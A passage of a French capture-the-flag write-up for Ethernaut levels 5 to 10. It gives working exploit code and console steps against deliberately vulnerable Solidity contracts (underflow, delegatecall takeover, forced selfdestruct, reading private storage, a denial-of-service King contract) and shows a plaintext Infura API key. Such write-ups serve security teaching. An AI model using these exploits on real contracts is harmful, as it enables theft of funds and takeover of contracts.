<p>Si le solde de notre compte est de 20 et que l’on veut transférer 21, alors le <code class="highlighter-rouge">require()</code> va réaliser le calcul suivant: <code class="highlighter-rouge">21-20 = -1</code>. Sauf que le <code class="highlighter-rouge">-1</code> va être représenté comme le plus grand entier possible ! Grâce à cela, nous pouvons passer la contrainte du <code class="highlighter-rouge">require()</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_value</span><span class="p">;</span>
</code></pre></div></div>

<p>La ligne ci-dessus est alors exécutée, et le solde de notre compte prend également la valeur maximale !</p>

<h3 id="attaque-4">Attaque</h3>

<p>Nous allons réaliser un transfert à une adresse quelconque, nous prendrons <code class="highlighter-rouge">contract.address</code> pour notre attaque. Notre transfert doit être supérieur à 20 pour réaliser l’underflow, nous prendrons 21.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// exploit uderflow</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="mi">21</span><span class="p">)</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
</code></pre></div></div>

<blockquote>
  <p>Overflows are very common in solidity and must be checked for with control statements such as:</p>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(a + c &gt; a) {
a = a + c;
}
</code></pre></div>  </div>

  <p>An easier alternative is to use OpenZeppelin’s SafeMath  library that automatically checks for overflows in all the mathematical  operators. The resulting code looks like this:</p>

  <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a = a.add(c);
</code></pre></div>  </div>

  <p>If there is an overflow, the code will revert.</p>
</blockquote>

<hr />

<h2 id="6---delegation">6 - Delegation</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Exploiter un appel à un <code class="highlighter-rouge">delegatecall</code> afin de modifier des variables du contexte courant.</p>
</blockquote>

<p>The goal of this level is for you claim ownership of the instance you are given.</p>

<p>Things that might help</p>

<ul>
  <li>Look into Solidity’s documentation on the <code class="highlighter-rouge">delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on  execution scope.</li>
  <li>Fallback methods</li>
  <li>Method ids</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Delegate</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Delegation</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
  <span class="nx">Delegate</span> <span class="nx">delegate</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_delegateAddress</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">delegate</span> <span class="o">=</span> <span class="nx">Delegate</span><span class="p">(</span><span class="nx">_delegateAddress</span><span class="p">);</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="p">{</span>
    <span class="p">(</span><span class="nx">bool</span> <span class="nx">result</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-5">Analyse</h3>

<p>Ce niveau est composé de 2 smart contacts.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Delegate</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_owner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">_owner</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">pwn</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">Delegate</code> possède une variable <code class="highlighter-rouge">owner</code>, qui est initialisée dans le constructeur. Il possède également la fonction <code class="highlighter-rouge">pwn()</code> qui permet de changer la valeur de <code class="highlighter-rouge">owner</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Delegation</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
  <span class="nx">Delegate</span> <span class="nx">delegate</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_delegateAddress</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">delegate</span> <span class="o">=</span> <span class="nx">Delegate</span><span class="p">(</span><span class="nx">_delegateAddress</span><span class="p">);</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="p">{</span>
    <span class="p">(</span><span class="nx">bool</span> <span class="nx">result</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">delegate</span><span class="p">).</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">this</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">Delegation</code> possède une variable <code class="highlighter-rouge">owner</code> ainsi qu’une instance de <code class="highlighter-rouge">Delegate</code>. Ces derniers sont initialisés dans le constructeur. Il définit également une fallback function qui réalise un <code class="highlighter-rouge">delegatecall()</code> vers l’instance de <code class="highlighter-rouge">Delegate</code>.</p>

<blockquote>
  <p>There exists a special variant of a message call, named <strong>delegatecall</strong> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code class="highlighter-rouge">msg.sender</code> and <code class="highlighter-rouge">msg.value</code> do not change their values.</p>

  <p>This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.</p>

  <p>This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to  implement a complex data structure.</p>
</blockquote>

<p>Un <code class="highlighter-rouge">delegatecall</code> permet d’exécuter du code externe dans le contexte courant du smart contract appelant. Pour devenir <code class="highlighter-rouge">owner</code>, nous devons appeler le fonction <code class="highlighter-rouge">pwn()</code> qui va modifier la valeur de <code class="highlighter-rouge">owner</code>.</p>

<h3 id="attaque-5">Attaque</h3>

<p>La fonction a appeler doit être dans <code class="highlighter-rouge">msg.data</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// we are not owner</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">false</span>

<span class="c1">// call pwn()</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="na">data</span><span class="p">:</span><span class="nx">web3</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">"pwn()"</span><span class="p">)})</span>

<span class="c1">// we are owner</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">owner</span><span class="p">()</span> <span class="o">==</span> <span class="nx">player</span>
<span class="kc">true</span>
</code></pre></div></div>

<blockquote>
  <p>Usage of <code class="highlighter-rouge">delegatecall</code> is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your  contract is practically saying “here, -other contract- or -other  library-, do whatever you want with my state”. Delegates have complete  access to your contract’s state. The <code class="highlighter-rouge">delegatecall</code> function is a powerful feature, but a dangerous one, and must be used with extreme care.</p>

  <p>Please refer to the <a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">The Parity Wallet Hack Explained</a> article for an accurate explanation of how this idea was used to steal 30M USD.</p>
</blockquote>

<hr />

<h2 id="7---force">7 - Force</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>On force un smart contrat a recevoir des ether en appelant <code class="highlighter-rouge">selfdestruct</code> d’un autre smart contract.</p>
</blockquote>

<p>Some contracts will simply not take your money <code class="highlighter-rouge">¯\_(ツ)_/¯</code></p>

<p>The goal of this level is to make the balance of the contract greater than zero.</p>

<p>Things that might help:</p>

<ul>
  <li>Fallback methods</li>
  <li>Sometimes the best way to attack a contract is with another contract.</li>
  <li>See the Help page above, section “Beyond the console”</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Force</span> <span class="p">{</span><span class="cm">/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/</span><span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-6">Analyse</h3>

<p>Pas grand chose à dire, puisqu’il n’y a rien.</p>

<p>Pour réussir ce challenge, nous devons augmenter le solde du smart contract. Nous devons réussir à augmenter son solde.</p>

<blockquote>
  <p><strong>Can a contract with no payable function have ether ?</strong></p>

  <p>Yes, a contract can have Ether balance without any <code class="highlighter-rouge">payable</code> function.</p>

  <p>There are three ways to do it:</p>

  <p>1) selfdestruction. Another contract self destructs and sends its remaining Ether to your contract</p>

  <p>2) Target of mining. Ether rewarded from mining can’t be refused.</p>

  <p>3) Ether sent to the contract before the contract exists.</p>

  <p>More details about these alternatives can found for example here: https://medium.com/@alexsherbuck/two-ways-to-force-ether-into-a-contract-1543c1311c56</p>
</blockquote>

<p>Nous allons alors créer un smart contract, lui envoyer des ethers, puis appeler la fonction <code class="highlighter-rouge">selfdestruct()</code> qui va détruire notre smart contract et envoyer nos ether à notre cible.</p>

<blockquote>
  <p>The only way to remove code from the blockchain is when a contract at that address performs the <code class="highlighter-rouge">selfdestruct</code> operation. The remaining Ether stored at that address is sent to a  designated target and then the storage and code is removed from the  state. Removing the contract in theory sounds like a good idea, but it  is potentially dangerous, as if someone sends Ether to removed  contracts, the Ether is forever lost.</p>
</blockquote>

<h3 id="attaque-6">Attaque</h3>

<p>Notre smart contract va recevoir des ether, puis on appel la fonction <code class="highlighter-rouge">kill()</code>.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>
    
    <span class="nx">uint256</span> <span class="kr">public</span> <span class="nx">money</span><span class="p">;</span>
    
    <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">money</span> <span class="o">=</span> <span class="nx">money</span> <span class="o">+</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="kd">function</span> <span class="nx">kill</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">selfdestruct</span><span class="p">(</span><span class="mh">0xa4d6d05221c2c11b467a9a916d1a867386f2978a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">)</span>
<span class="s2">"0"</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">)</span>
<span class="s2">"0.000000000000000001"</span>
</code></pre></div></div>

<blockquote>
  <p>In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.</p>

  <p>However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant <code class="highlighter-rouge">this.balance == 0</code> for any contract logic.</p>
</blockquote>

<hr />

<h2 id="8---vault">8 - Vault</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Lire un mot de passe présent sur le slot numéro 1 en utilisant <code class="highlighter-rouge">myth</code>.</p>
</blockquote>

<p>Unlock the vault to pass the level!</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Vault</span> <span class="p">{</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">locked</span><span class="p">;</span>
  <span class="nx">bytes32</span> <span class="kr">private</span> <span class="nx">password</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="nx">password</span> <span class="o">=</span> <span class="nx">_password</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">unlock</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_password</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">password</span> <span class="o">==</span> <span class="nx">_password</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-7">Analyse</h3>

<p>Ce smart contract est assez simple à comprendre. Le constructeur permet de locker le contrat avec un mot de passe. Pour unlocker ce dernier, il faut connaître le mot de passe.</p>

<blockquote>
  <p><a href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/">Smart contract storage</a></p>
</blockquote>

<p>Le mot de passe contenu dans <code class="highlighter-rouge">password</code> est dans le slot 2 du smart contract. Pour lire le contenu de ce slot 2, nous allons utiliser <a href="https://github.com/ConsenSys/mythril">mythril</a>. C’est un outil qui peut permettre de lire les slots d’un smart contract.</p>

<h3 id="attaque-7">Attaque</h3>

<blockquote>
  <p><strong>Obtenir un INFURA_ID</strong></p>

  <p>Avant de pouvoir utiliser <code class="highlighter-rouge">mythril</code> il faut récupérer un <code class="highlighter-rouge">infura_id</code>, c’est une sorte de clé d’API:</p>

  <ul>
    <li>créer un compte sur <code class="highlighter-rouge">https://infura.io/register</code></li>
    <li>créer un projet</li>
    <li>récupérer l’<code class="highlighter-rouge">API key</code> ou le <code class="highlighter-rouge">PROJECT ID</code></li>
  </ul>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># slot 0</span>
<span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">--net</span><span class="o">=</span>host <span class="nt">-e</span> <span class="nv">INFURA_ID</span><span class="o">=</span>ceb5f54c0bff4da6919aa26300f5bedd mythril/myth read-storage <span class="nt">--rpc</span> infura-ropsten 0 0x1D9EDF73319C88C52680F875909B42C53216B5C0
<span class="c"># INFURA_ID=ceb5f...: our API key</span>
<span class="c"># read-storage: retrieves storage slots from a given address through rpc</span>
<span class="c"># --rpc infura-ropsten: use ropsten network</span>
<span class="c"># 0: read slot 0</span>
<span class="c"># 0x1D9: contract address</span>
0: 0x0000000000000000000000000000000000000000000000000000000000000001


<span class="c"># slot 1</span>
<span class="nv">$ </span>docker run <span class="nt">-it</span> <span class="nt">--net</span><span class="o">=</span>host <span class="nt">-e</span> <span class="nv">INFURA_ID</span><span class="o">=</span>ceb5f54c0bff4da6919aa26300f5bedd mythril/myth read-storage <span class="nt">--rpc</span> infura-ropsten 1 0x1D9EDF73319C88C52680F875909B42C53216B5C0
1: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

<span class="c"># other method to read</span>
<span class="o">&gt;</span> await web3.eth.getStorageAt<span class="o">(</span><span class="s2">"0x1D9EDF73319C88C52680F875909B42C53216B5C0"</span>,0<span class="o">)</span>
<span class="o">&gt;</span> await web3.eth.getStorageAt<span class="o">(</span><span class="s2">"0x1D9EDF73319C88C52680F875909B42C53216B5C0"</span>,1<span class="o">)</span>
</code></pre></div></div>

<p>On peut essayer de décoder la valeur du slot 2: <code class="highlighter-rouge">0x412076657279207...</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3
<span class="o">&gt;</span> import binascii as ba
<span class="o">&gt;</span> ba.unhexlify<span class="o">(</span><span class="s1">'412076657279207374726f6e67207365637265742070617373776f7264203a29'</span><span class="o">)</span>
b<span class="s1">'A very strong secret password :)'</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">locked</span><span class="p">()</span>
<span class="kc">true</span>

<span class="c1">// 2 different ways</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="s2">"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"</span><span class="p">)</span>
<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">fromAscii</span><span class="p">(</span><span class="s2">"A very strong secret password :)"</span><span class="p">))</span>

<span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">locked</span><span class="p">()</span>
<span class="kc">false</span>
</code></pre></div></div>

<blockquote>
  <p><a href="https://ropsten.etherscan.io/bytecode-decompiler?a=0x1D9EDF73319C88C52680F875909B42C53216B5C0">Decompile smart contract</a></p>
</blockquote>

<blockquote>
  <p>It’s important to remember that marking a variable as private only  prevents other contracts from accessing it. State variables marked as  private and local variables are still publicly accessible.</p>

  <p>To  ensure that data is private, it needs to be encrypted before being put  onto the blockchain. In this scenario, the decryption key should never  be sent on-chain, as it will then be visible to anyone who looks for it. <a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a> provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.</p>
</blockquote>

<hr />

<h2 id="9---king">9 - King</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Garder le propriété d’un smart contract, empêcher les autres acheteurs de l’acheter en ajoutant un <code class="highlighter-rouge">revert()</code> dans la fallback function de notre contrat (qui est le propriétaire).</p>
</blockquote>

<p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new  king. On such an event, the overthrown king gets paid the new prize,  making a bit of ether in the process! As ponzi as it gets xD</p>

<p>Such a fun game. Your goal is to break it.</p>

<p>When you submit the instance back to the level, the level is going to  reclaim kingship. You will beat the level if you can avoid such a self  proclamation.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">King</span> <span class="p">{</span>

  <span class="nx">address</span> <span class="nx">payable</span> <span class="nx">king</span><span class="p">;</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">prize</span><span class="p">;</span>
  <span class="nx">address</span> <span class="nx">payable</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>

  <span class="kd">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>  
    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;=</span> <span class="nx">prize</span> <span class="o">||</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">);</span>
    <span class="nx">king</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
    <span class="nx">king</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
    <span class="nx">prize</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">_king</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">address</span> <span class="nx">payable</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">king</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="analyse-8">Analyse</h3>

<p>Le but de ce smart contract est de simuler une sorte de mise aux enchéres, à chaque fois que l’on propose un prix supérieur au prix actuel, on devient propriétaire.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">prize</span><span class="p">()</span>
<span class="mi">1000000000000000000</span> <span class="c1">// 1 ether</span>
</code></pre></div></div>

<p>Il est facile de devenir propriétaire, mais pas de le rester. La but va être de bloquer <code class="highlighter-rouge">king.transfer(msg.value)</code>. Cette instruction est censée donner les ethers à l’ancien propriétaire avant que le nouveau ne soit mit en place.</p>

<p>Imaginons que <code class="highlighter-rouge">king</code> est un autre smart contract et non un vrai utilisateur. Dans ce cas, lorsque <code class="highlighter-rouge">king.transfer(msg.value)</code> sera appelée, c’est la fallback function qui sera exécutée.</p>

<p>Pour ne pas autoriser la réception d’ether sur un smart contract nous allons utiliser <code class="highlighter-rouge">revert()</code> dans notre fallback function !</p>

<h3 id="attaque-8">Attaque</h3>

<p>Nous allons déployer ce smart contract avec 1.1 ether.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Attack</span> <span class="p">{</span>

    <span class="kd">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">addr</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="p">(</span><span class="nx">bool</span> <span class="nx">result</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">addr</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
        <span class="nx">revert</span><span class="p">(</span><span class="s2">"nop"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>Most of Ethernaut’s levels try to expose (in an oversimpliefied form  of course) something that actually happend. A real hack or a real bug.</p>

  <p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html">King of the Ether Postmortem</a></p>
</blockquote>

<hr />

<h2 id="10---re-entrancy">10 - Re-entrancy</h2>

<hr />

<blockquote>
  <p><strong>TL;DR</strong></p>

  <p>Du classique: re-entrancy attack !</p>
</blockquote>

<p>The goal of this level is for you to steal all the funds from the contract.</p>

<p>Things that might help:</p>

<ul>
  <li>Untrusted contracts can execute code where you least expect it.</li>
  <li>Fallback methods</li>
  <li>Throw/revert bubbling</li>
  <li>Sometimes the best way to attack a contract is with another contract.</li>
  <li>See the Help page above, section “Beyond the console”</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s1">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Reentrance</span> <span class="p">{</span>
  
  <span class="nx">using</span> <span class="nx">SafeMath</span> <span class="k">for</span> <span class="nx">uint256</span><span class="p">;</span>
  <span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nx">donate</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_to</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{</span>
    <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_who</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint</span> <span class="nx">balance</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">_who</span><span class="p">];</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">_amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">_amount</span><span class="p">)</span> <span class="p">{</span>
      <span class="p">(</span><span class="nx">bool</span> <span class="nx">result</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">)</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="nx">_amount</span><span class="p">)(</span><span class="s2">""</span><span class="p">);</span>
      <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_amount</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">_amount</span><span class="p">;</span>
    <span class="p">}</span>
